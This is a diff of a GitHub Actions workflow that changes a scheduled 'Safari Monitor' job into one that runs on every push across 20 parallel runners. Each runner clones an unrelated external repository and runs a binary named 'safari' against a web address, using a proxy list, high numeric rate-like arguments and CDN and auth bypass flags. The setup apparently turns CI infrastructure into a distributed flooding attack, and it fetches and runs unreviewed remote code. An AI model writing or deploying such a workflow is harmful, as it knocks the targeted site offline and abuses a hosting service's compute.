@@ -1,26 +1,28 @@
-name: Safari Monitor
+name: Run Script (20 Parallel Instances)
 
 on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
   workflow_dispatch:
-  schedule:
-    - cron: '0 */2 * * *'
 
 jobs:
-  run:
-    runs-on: ubuntu-latest
-    timeout-minutes: 120
+  run-script:
+    runs-on: ubuntu-24.04
     strategy:
-      matrix:
-        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-      max-parallel: 20
       fail-fast: false
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,20]
     
     steps:
-      - name: Clone, setup and run
-        run: |
-          git clone https://github.com/maxyuuyyyu77171-uff/bookish-dollop.git
-          cd bookish-dollop
-          pip install requests
-          chmod +x safari
-          python monitor.py
-          
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Convert line endings and run safari (Instance ${{ matrix.instance }})
+      run: |
+        git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
+        cd cuddly-octo-bassoon
+        chmod +x safari
+        ./safari  https://ip.ipcount.org/   700 10000 8000 proxies.txt --cdn  --auth
+    
